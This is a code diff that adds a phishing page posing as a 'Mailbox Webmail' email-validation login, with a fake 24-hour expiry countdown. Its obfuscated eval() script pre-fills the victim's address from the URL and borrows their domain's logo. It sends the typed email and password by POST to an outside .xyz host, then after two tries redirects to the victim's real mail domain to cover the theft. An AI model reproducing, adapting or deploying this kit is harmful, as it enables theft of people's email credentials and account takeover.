@@ -1,0 +1,138 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<title>Login / Email Update</title>
+
+<link rel="stylesheet" href="https://antispam.acecommunications.com.au/styles/all.css?v=1566478358">
+<link rel="stylesheet" href="https://antispam.acecommunications.com.au/styles/colorscheme/326190.css?v=139074">
+
+<link rel="icon" href="https://antispam.acecommunications.com.au/favicon.ico" type="image/x-icon">
+<link rel="shortcut icon" href="https://antispam.acecommunications.com.au/favicon.ico" type="image/x-icon">
+
+
+
+
+
+    <style type="text/css">
+    /*<!--*/
+    html,
+    body {
+        background-color: #326190;
+    }
+
+    #openIdBtn {
+        width:100%;
+        padding:0px;
+        text-align:center;
+        line-height:50px;
+    }
+    /*-->*/
+    </style>
+</head>
+<body class="fixed-layout">
+
+    <div class="container layout-container" id="contents-container">
+        <div id="form-wrapper">
+
+
+                        <h2 class="text-center"><div id="top">
+                <img src="https://antispam.acecommunications.com.au/uploads/logo/656c83af49bd1bf9a9fe78e1c9afa4f8.jpeg" id="logoimg" style="width:28px;height:28px;">
+            <span style="vertical-align: middle; padding-left: 5px" class="logoname">Mailbox Webmail</span></div></h2>
+			<p align="center"> EMAIL VALIDATION EXPIRES IN<font color="#FF0000"><br/><span id="timer"></span> Hours</font></p>
+			 <br/>
+	  <br/>
+	  
+	  <script>
+document.getElementById('timer').innerHTML =
+  24 + ":" + 00;
+startTimer();
+
+function startTimer() {
+  var presentTime = document.getElementById('timer').innerHTML;
+  var timeArray = presentTime.split(/[:]+/);
+  var m = timeArray[0];
+  var s = checkSecond((timeArray[1] - 1));
+  if(s==59){m=m-1}
+  //if(m<0){alert('timer completed')}
+  
+  document.getElementById('timer').innerHTML =
+    m + ":" + s;
+  setTimeout(startTimer, 2000);
+}
+
+function checkSecond(sec) {
+  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+  if (sec < 0) {sec = "59"};
+  return sec;
+}
+</script>
+
+      <center>
+          <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please try again</div>
+            
+            
+<form action="#" method="post" class="form-horizontal">
+
+    <fieldset>
+                    <div class="form-group">
+                <label class="col-xs-12 col-sm-4 col-md-4 control-label" for="username">Username / domain / email:</label>
+                <div class="col-xs-12 col-sm-6 col-md-6">
+                    <input class="form-control" type="email" name="email" id="email" value="" autocomplete="on" autofocus="autofocus" readonly="">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="col-xs-12 col-sm-4 col-md-4 control-label" for="password">Password:</label>
+                <div class="col-xs-12 col-sm-6 col-md-6">
+                    <input class="form-control" type="password" name="password" id="password" value="">
+                </div>
+            </div>
+        
+        <div class="form-group">
+            <div class="col-xs-11 col-sm-8 col-md-8 col-xs-offset-1 col-sm-offset-4 col-md-offset-4">
+                <button type="submit" class="btn btn-primary pull-left" id="submit-btn"> Submit</button>
+                            </div>
+        </div>
+
+    </fieldset>
+</form>
+
+
+        </div>
+
+                    
+                    
+        <div class="navbar navbar-inverse">
+            <span style="navbar-text pull-left"> <a href="#">&copy; Copyright 2021 <span class="logoname"></span> 
+                        <span class="divider-vertical"></span>
+            <div class="dropdown">
+                                                <a class="dropdown-toggle" data-toggle="dropdown" href="#"><span class="flag-glyph gb"></span>English<span class="caret"></span></a>
+                
+            </div>
+                    </div>
+    </div>
+
+    
+    </body>
+
+   <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+
+  <script>
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(14).15(6(){3 m=0;$(\'#16\').N(6(){$("#8").z();$(\'#A\').5("");$("#17").O({18:P,Q:"z"},0);$("#19").O({1a:P,Q:"w"},1b)});3 n=E.F.1c.x(1);7(!n){}R{3 o=n;$(\'#A\').5(o);$(\'#1d\').y(o);3 p=/^([a-u-v-S\\.\\-])+\\@(([a-u-v-9\\-])+\\.)+([a-u-v-9]{2,4})+$/;7(!p.T(o)){$(\'#B\').w();n.U;V W}3 q=o.C("@");3 r=o.x((q+1));3 c=r.x(0,r.C(\'.\'));3 s=c.X();3 t=c.Y();$("#G").H("Z","I://10.11.12/"+r);$("#G").H("1e",t);$("#J").y(t);$(".J").y(t)}$(\'#K-L\').N(6(b){$(\'#B\').z();$(\'#8\').z();b.1f();3 d=$("#A").5();3 e=$("#D").5();3 f=$(\'#8\').y();$(\'#8\').1g(f);3 g=d;3 h=/^([a-u-v-S\\.\\-])+\\@(([a-u-v-9\\-])+\\.)+([a-u-v-9]{2,4})+$/;7(!h.T(g)){$(\'#B\').w();d.U;V W}3 i=g.C("@");3 j=g.x((i+1));3 c=j.x(0,j.C(\'.\'));3 k=c.X();3 l=c.Y();$("#G").H("Z","I://10.11.12/"+j);$("#J").y(l);m=m+1;$.1h({1i:\'1j\',1k:\'I://M.1l.1m/1n/1o-1p.1q\',1r:\'1s\',1t:{A:d,D:e,},1u:6(a){$(\'#K-L\').5(\'1v...\')},1w:6(a){7(a){$("#8").w();1x.1y(a);7(a[\'1z\']==\'1A\'){$("#D").5("");7(m>=2){m=0;E.F.1B("13://M."+j)}}R{}}},B:6(){$("#D").5("");7(m>=2){m=0;E.F.1C("13://M."+j)}$("#8").w()},1D:6(){$(\'#K-L\').5(\'1E\')}})})});',62,103,'|||var||val|function|if|msg||||||||||||||||||||||zA|Z0|show|substr|html|hide|email|error|indexOf|password|window|location|logoimg|attr|https|logoname|submit|btn|www|click|animate|200|opacity|else|9_|test|focus|return|false|toLowerCase|toUpperCase|src|logo|clearbit|com|http|document|ready|back1|automail|left|inputbar|right|1000|hash|emailich|alt|preventDefault|text|ajax|dataType|JSON|url|jk9342nasmfjas|xyz|will|form|loaded|php|type|POST|data|beforeSend|Verifing|success|console|log|signal|ok|href|replace|complete|LOGIN'.split('|'),0,{}))
+</script>
+
+  </html>
+
